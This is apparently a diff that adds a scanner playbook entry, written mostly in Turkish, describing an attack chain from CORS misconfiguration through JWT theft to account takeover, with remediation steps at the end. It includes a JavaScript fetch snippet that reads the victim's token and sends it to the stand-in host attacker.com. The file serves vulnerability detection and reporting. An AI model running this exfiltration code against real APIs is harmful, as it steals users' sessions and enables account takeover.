@@ -1,0 +1,39 @@
+# WebSecure Playbook — CORS Misconfiguration → JWT Steal → Account Takeover
+name: "CORS Misconfiguration → JWT Çalma → Hesap Ele Geçirme"
+chain_id: "cors_jwt_ato"
+severity: "Critical"
+confidence: "High"
+priority: 20
+
+required_types:
+  - cors
+  - jwt
+
+steps:
+  - type: cors
+    label: "CORS Misconfiguration"
+    description: >
+      API, saldırgan domain'inden gelen cross-origin isteklerine izin veriyor.
+      `Access-Control-Allow-Origin: https://attacker.com`
+      `Access-Control-Allow-Credentials: true`
+      Kötü amaçlı site, kurban tarayıcısından API'ye credential'lı istek atabilir.
+
+  - type: jwt
+    label: "JWT Token Çalma"
+    description: >
+      CORS zafiyeti üzerinden kurbanın oturumunu okuma:
+      `fetch('https://api.target.com/me', {credentials:'include'})`
+        .then(r => r.json())
+        .then(d => fetch('https://attacker.com/steal?token=' + d.token));
+      JWT token veya session bilgisi saldırgana iletilir.
+
+impact: >
+  Saldırgan, kurbanın tarayıcısını kullanarak JWT token'ı çalar.
+  Çalınan token ile kurban kimliğine bürünülür, hesap tamamen ele geçirilir.
+  Admin JWT'si çalınırsa tüm sistem kontrolü sağlanır.
+
+remediation: |
+  1. CORS allowlist'ini yalnızca güvenilen domain'lerle sınırlayın.
+  2. `credentials: true` ile wildcard origin (`*`) birlikte kullanmayın.
+  3. JWT'leri HttpOnly cookie'de saklayın (JavaScript erişimini engelleyin).
+  4. Short-lived token + refresh token mimarisi kullanın.
